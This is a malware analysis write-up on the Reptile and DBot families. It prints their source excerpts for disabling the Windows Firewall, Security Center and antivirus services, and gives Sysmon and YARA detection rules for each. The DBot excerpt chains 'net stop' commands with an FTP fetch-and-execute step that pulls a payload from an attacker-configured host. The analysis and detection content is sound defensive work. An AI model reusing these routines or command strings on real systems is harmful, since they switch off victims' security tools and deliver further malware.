# Reptile & DBot - Multi-Vector Defense Impairment

**Repositories:** `MalwareSourceCode-main`, `theZoo-master`  
**Files:** 
- **Reptile:** `Win32/Malware Families/Win32.Reptile/Win32.Reptile.axb/Win32.Reptile.axb/secure.cpp`
- **DBot:** `malware/Source/Original/DBotv3.1_March2007/DBotv3.1_March2007/DBot v3.1 - March 2007/scanner.cpp`

**Languages:** C++, C  
**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools), T1489 (Service Stop), T1112 (Modify Registry)

## Overview

The Reptile and DBot malware families, while distinct, both exemplify a multi-layered approach to disabling security defenses on a compromised Windows machine. They go beyond simple process termination and attack the configuration and runtime state of security tools through different but complementary methods. Reptile uses a surgical, API-driven approach to modify the registry and stop services, while DBot uses a brute-force, command-line approach to stop a wide array of AV services.

## Code Snippet & Analysis

### Technique 1: Reptile's API-Based Registry & Service Attack

Reptile's `secure.cpp` module contains a comprehensive framework for disabling the Windows Firewall, Security Center, and other services by directly manipulating the registry and calling Service Control Manager APIs.

```cpp
// --- Registry Modification Array ---
REGENT SecureReg[]={
    // Disable Firewall via Group Policy
    {HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile", "EnableFirewall", REG_DWORD, 0x00000000, 0x00000001},
    {HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile", "EnableFirewall", REG_DWORD, 0x00000000, 0x00000001},
    
    // Disable Security Center service startup
    {HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\wscsvc", "Start", REG_DWORD, 0x00000004, 0x00000002}, // 4 = SERVICE_DISABLED
    // ... and 16 other registry modifications
};

// --- Service Stopping Array ---
char *stoplist[] = { "Tlntsvr", "RemoteRegistry", "Messenger", "SharedAccess", "wscsvc" };

// --- Service Stopping Function ---
void SecureServices(...)
{
	SC_HANDLE hServiceControl = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	for(int x=0; x < 5; x++)
	{
 		SC_HANDLE schService = OpenService(hServiceControl, stoplist[x], SERVICE_ALL_ACCESS);
		if (schService != NULL)
		{ 
            SERVICE_STATUS ssStatus;
			ControlService(schService, SERVICE_CONTROL_STOP, &ssStatus);
		}
		CloseServiceHandle(schService);
	}
	CloseServiceHandle(hServiceControl);
}
```

**What it does (Reptile):**
1.  **Disables via Registry:** It iterates through the `SecureReg` array, writing values to the registry to disable the Windows Firewall at the policy level and change the startup type of the Security Center service (`wscsvc`) to `SERVICE_DISABLED`.
2.  **Stops via API:** It then iterates through the `stoplist` array, using `OpenSCManager`, `OpenService`, and `ControlService` to programmatically send a "STOP" command to the running services, including `SharedAccess` (the Windows Firewall).

### Technique 2: DBot's Command-Line Service Attack

DBot's `scanner.cpp` module takes a less elegant but equally effective approach. After compromising a machine, it constructs a single, massive command string to be executed by `cmd.exe`, chaining together multiple `net stop` commands.

```cpp
// From the ConnectShell function, which runs on a compromised host
char mkdir_buff[400];

// Construct a single command line to stop multiple AV services and then download the next stage
_snprintf(mkdir_buff, sizeof(mkdir_buff),
    "net stop \"AntiVir PersonalEdition Classic Guard\" &"
    "net stop \"Security Center\" &"
    "net stop \"Symantec AntiVirus\" &"
    "net stop \"Norton AntiVirus Server\" &"
    "net stop navapsvc &"
    "net stop kavsvc &"
    "net stop McAfeeFramework &"
    "net stop NOD32krn &"
    "net stop McShield &"
    "echo open %s %d > i&echo user %s %s >> i &echo get %s >> i &echo bye >> i &" // FTP commands
    "ftp -n -v -s:i &"
    "del i &"
    "%s &" // Execute downloaded file
    "exit",
    CFTPHost, CFTPPort, CFTPUser, CFTPPass, CFTPPath, CFTPFile);

// The command is then sent to the shell
send(sockfd, mkdir_buff, strlen(mkdir_buff), 0);
```

**What it does (DBot):**
1.  **Constructs Command String:** It uses `_snprintf` to build a long command string.
2.  **Chains `net stop` Commands:** It uses the `&` operator to chain nine `net stop` commands together, targeting services from Avira, Symantec, Kaspersky, McAfee, and ESET, as well as the Windows Security Center.
3.  **Executes via Shell:** This command string is sent to a remote shell, executing `net.exe` to stop the services before proceeding to download and run the next payload via FTP.

## Detection & Evasion

### Reptile (API-Based) Detection

**Sysmon Rule:**
```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Reptile Defense Impairment" groupRelation="or">
            <RegistryEvent onmatch="include">
                <TargetObject condition="contains">CurrentControlSet\Services\</TargetObject>
                <TargetObject condition="end with">\Start</TargetObject>
                <Details>DWORD (0x00000004)</Details> <!-- SERVICE_DISABLED -->
            </RegistryEvent>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Yara Rule:**
```yara
rule TTP_Reptile_Secure_Module
{
    meta:
        author = "GitHub Copilot"
        description = "Detects the Reptile/Plague defense impairment module."
        mitre_ttp = "T1562.001"
        malware = "Reptile"
    strings:
        $reg1 = "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall" wide ascii
        $reg2 = "EnableFirewall" wide ascii
        $svc1 = "SharedAccess" wide ascii
        $svc2 = "wscsvc" wide ascii
    condition:
        uint16(0) == 0x5a4d and all of them
}
```

### DBot (Command-Line) Detection

**Sysmon Rule:**
```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="DBot Defense Impairment" groupRelation="and">
            <ProcessCreate onmatch="include">
                <Image condition="end with">\net.exe</Image>
                <CommandLine condition="contains">stop</CommandLine>
                <CommandLine condition="contains any">
                    AntiVir;Security Center;Symantec;Norton;navapsvc;kavsvc;McAfee;NOD32;McShield
                </CommandLine>
            </ProcessCreate>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Yara Rule:**
```yara
rule TTP_DBot_NetStop_AV
{
    meta:
        author = "GitHub Copilot"
        description = "Detects DBot and similar malware by its command-line string for stopping AV services."
        mitre_ttp = "T1489"
        malware = "DBot"
    strings:
        $s1 = "net stop \"AntiVir PersonalEdition Classic Guard\"" ascii
        $s2 = "net stop \"Security Center\"" ascii
        $s3 = "net stop \"Symantec AntiVirus\"" ascii
        $s4 = "net stop McAfeeFramework" ascii
        $s5 = "net stop NOD32krn" ascii
    condition:
        uint16(0) == 0x5a4d and 3 of them
}
````
